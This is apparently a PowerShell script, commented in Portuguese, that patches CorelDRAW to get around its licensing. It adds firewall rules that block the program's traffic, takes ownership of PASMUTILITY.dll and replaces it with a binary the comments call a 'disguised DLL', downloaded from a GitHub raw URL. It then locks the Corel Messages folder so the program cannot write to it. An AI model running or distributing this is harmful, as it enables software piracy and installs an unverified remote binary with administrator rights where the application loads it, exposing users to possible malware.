# URL direta para a DLL disfarçada
$urlBin = "https://github.com/dayvson009/poneyrosa/raw/refs/heads/main/27.bin"

$caminhoCorel = "$env:ProgramFiles\Corel\PASMUtility\v1"
$destino = "$caminhoCorel\PASMUTILITY.dll"
$exeCorel = "$env:ProgramFiles\Corel\CorelDRAW Graphics Suite\27\Programs64\CorelDRW.exe"

# 1. Firewall (Ações que exigem Admin)
netsh advfirewall firewall add rule name="Corel27_Block_Out" dir=out action=block program="$exeCorel" enable=yes
netsh advfirewall firewall add rule name="Corel27_Block_In" dir=in action=block program="$exeCorel" enable=yes

# 2. Processo de Patch
if (Test-Path $caminhoCorel) {
    if (Test-Path $destino) {
        Set-ItemProperty $destino -Name IsReadOnly -Value $false
        takeown /f $destino /a > $null
        icacls $destino /grant "Administrators:F" > $null
        Remove-Item $destino -Force -ErrorAction SilentlyContinue
    }

    try {
        Invoke-WebRequest -Uri $urlBin -OutFile $destino -MaximumRedirection 5 -ErrorAction Stop
        if (Test-Path $destino) { Write-Host "Sucesso" }
    } catch {
        Write-Host "Erro_Download"
    }
} else {
    Write-Host "Pasta_Nao_Encontrada"
}

# 3. Limpeza e Bloqueio da pasta de Mensagens (Pop-ups)
$caminhoMessages = "$env:AppData\Corel\Messages"

if (Test-Path $caminhoMessages) {
    Write-Host "Limpando pasta de mensagens..."
    Get-ChildItem -Path $caminhoMessages -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue

    Write-Host "Bloqueando gravação na pasta Messages..."
    
    # Obtém a ACL atual
    $acl = Get-Acl $caminhoMessages
    
    # 1. Desativa a herança (mantém as permissões atuais como explícitas e remove o resto)
    # O primeiro $true copia as regras, o segundo $false remove a herança
    $acl.SetAccessRuleProtection($true, $false)
    
    # 2. Define a regra de NEGAR gravação para "Todos" (Everyone)
    # Usar "Everyone" ou "Todos" garante que nem o sistema nem o app gravem lá
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Todos", "Write", "Deny")
    
    $acl.AddAccessRule($rule)
    
    # Aplica a nova configuração
    Set-Acl $caminhoMessages $acl
    Write-Host "Pasta Messages bloqueada com sucesso."
}